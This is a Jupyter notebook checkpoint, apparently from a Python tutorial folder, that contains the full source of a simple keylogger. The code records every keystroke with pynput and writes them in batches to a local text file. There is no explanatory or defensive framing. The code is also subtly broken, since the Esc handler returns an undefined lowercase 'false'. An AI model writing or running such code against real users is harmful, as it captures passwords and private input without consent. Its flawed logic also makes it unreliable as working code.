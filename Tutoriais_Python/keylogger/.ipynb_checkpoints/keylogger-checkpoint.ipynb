{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "contador=0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "teclas=[]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def pressionar(tecla):\n",
    "    global teclas, contador\n",
    "    teclas.append(tecla)\n",
    "    contador +=1\n",
    "    print(tecla)\n",
    "    if contador >=10:\n",
    "        contador=0\n",
    "        salvar(teclas)\n",
    "        teclas=[]\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def salvar(teclas):\n",
    "    with open(\"salvar.txt\", \"a\") as file:\n",
    "        for tecla in teclas:\n",
    "            _tecla=str(tecla).replace(\"'\",\"\")\n",
    "            if _tecla.find(\"space\") > 0:\n",
    "                file.write(\"\\n\")\n",
    "            elif _tecla.find(\"tecla\")==-1:\n",
    "                file.write(_tecla)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def liberar(tecla):\n",
    "    if tecla== Key.esc:\n",
    "        return false"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=pressionar, \n",
    "              on_release=liberar) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
